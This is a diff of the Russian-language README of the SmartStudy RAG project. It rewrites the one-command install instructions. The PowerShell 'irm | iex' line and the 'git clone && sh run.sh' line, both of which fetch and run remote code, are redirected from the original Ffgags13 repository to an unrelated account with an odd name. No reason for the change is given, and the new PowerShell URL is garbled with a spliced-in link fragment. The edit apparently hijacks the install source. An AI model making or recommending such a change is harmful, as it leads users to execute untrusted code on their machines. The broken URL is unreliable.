@@ -48,7 +48,7 @@ SmartStudy RAG индексирует лекции и методички, ище
 ### Одна команда (Windows)
 
 ```powershell
-irm https://raw.githubusercontent.com/Ffgags13/SmartStudy_RAG/main/install-images.ps1 | iex
+irm https://raw.githubusercontent.com/Ffgags13/SmartStudy_RAG](https://github.com/skare1111111111111111111111111111111111/SmartStudy_RAG/main/install-images.ps1 | iex
 ```
 
 **Уже скачано:**
@@ -60,7 +60,7 @@ docker compose pull; docker compose up -d
 ### Linux / macOS
 
 ```bash
-git clone --depth 1 https://github.com/Ffgags13/SmartStudy_RAG.git && cd SmartStudy_RAG && sh run.sh
+git clone --depth 1 https://github.com/skare1111111111111111111111111111111111/SmartStudy_RAG.git && cd SmartStudy_RAG && sh run.sh
 ```
 
 ### EXE-установщик
